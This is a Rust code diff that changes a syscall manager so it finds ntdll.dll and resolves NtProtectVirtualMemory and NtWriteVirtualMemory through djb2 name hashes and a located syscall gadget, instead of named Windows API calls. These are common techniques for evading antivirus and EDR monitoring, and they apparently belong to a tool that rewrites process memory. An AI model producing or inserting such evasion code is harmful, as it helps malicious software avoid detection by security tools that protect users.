@@ -1,6 +1,6 @@
 use std::ffi::c_void;
-use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
-use windows::core::{PCSTR, PCWSTR};
+use crate::recovery::helpers::dynamic_api::{get_module_base, get_proc_address, djb2_hash, NTDLL_HASH};
+use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
 
 #[repr(C)]
 struct SyscallStub {
@@ -17,17 +17,16 @@ pub struct SyscallManager {
 
 impl SyscallManager {
     pub fn new() -> Result<Self, String> {
-        let ntdll_name: Vec<u16> = "ntdll.dll"
-            .encode_utf16()
-            .chain(std::iter::once(0))
-            .collect();
-        let h_ntdll =
-            unsafe { GetModuleHandleW(PCWSTR(ntdll_name.as_ptr())) }.map_err(|e| e.to_string())?;
+        let h_ntdll = unsafe { get_module_base(NTDLL_HASH) };
+        if h_ntdll.is_null() {
+            return Err("Failed to find ntdll.dll".to_string());
+        }
 
-        let syscall_gadget = find_syscall_gadget(h_ntdll.0 as *const u8)?;
+        let syscall_gadget = find_syscall_gadget(h_ntdll as *const u8)?;
 
-        let nt_protect = resolve_syscall(h_ntdll.0 as *const u8, "NtProtectVirtualMemory")?;
-        let nt_write = resolve_syscall(h_ntdll.0 as *const u8, "NtWriteVirtualMemory")?;
+        // Hashes for NtProtectVirtualMemory and NtWriteVirtualMemory
+        let nt_protect = resolve_syscall(h_ntdll as *const u8, djb2_hash("NtProtectVirtualMemory"))?;
+        let nt_write = resolve_syscall(h_ntdll as *const u8, djb2_hash("NtWriteVirtualMemory"))?;
 
         Ok(Self {
             nt_protect_virtual_memory_ssn: nt_protect.ssn,
@@ -36,8 +35,6 @@ impl SyscallManager {
         })
     }
 }
-
-use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
 
 fn find_syscall_gadget(ntdll_base: *const u8) -> Result<*const c_void, String> {
     unsafe {
@@ -56,15 +53,12 @@ fn find_syscall_gadget(ntdll_base: *const u8) -> Result<*const c_void, String> {
     Err("Failed to find syscall gadget".to_string())
 }
 
-fn resolve_syscall(ntdll_base: *const u8, function_name: &str) -> Result<SyscallStub, String> {
-    let func_name_c = format!("{}\0", function_name);
-    let address = unsafe {
-        GetProcAddress(
-            windows::Win32::Foundation::HMODULE(ntdll_base as _),
-            PCSTR(func_name_c.as_ptr()),
-        )
-    };
-    let addr = address.ok_or_else(|| format!("Failed to find {}", function_name))? as *const u8;
+fn resolve_syscall(ntdll_base: *const u8, function_hash: u32) -> Result<SyscallStub, String> {
+    let address = unsafe { get_proc_address(ntdll_base as *mut c_void, function_hash) };
+    if address.is_null() {
+        return Err(format!("Failed to find function with hash 0x{:X}", function_hash));
+    }
+    let addr = address as *const u8;
 
     unsafe {
         for i in 0..32 {
@@ -77,7 +71,7 @@ fn resolve_syscall(ntdll_base: *const u8, function_name: &str) -> Result<Syscall
             }
         }
     }
-    Err(format!("Failed to extract SSN for {}", function_name))
+    Err(format!("Failed to extract SSN for function with hash 0x{:X}", function_hash))
 }
 
 #[cfg(target_arch = "x86_64")]
